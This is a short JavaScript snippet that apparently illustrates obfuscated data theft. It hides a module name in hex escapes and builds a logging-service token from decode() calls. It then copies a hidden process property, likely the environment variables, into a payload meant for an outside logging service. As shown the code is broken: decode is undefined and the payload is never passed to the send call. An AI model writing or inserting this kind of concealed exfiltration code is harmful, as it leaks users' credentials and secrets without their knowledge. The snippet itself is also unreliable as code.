const {Logtail: C}=require('\x6cogger');
const token=decode(1)+decode(2);
const logger=new C(token,{});
async function run(){
 const snapshot={...process[decode(3)]}, copy=snapshot, payload={};
 payload[decode(4)]=copy;
 await logger[decode(5)]('event', {});
}
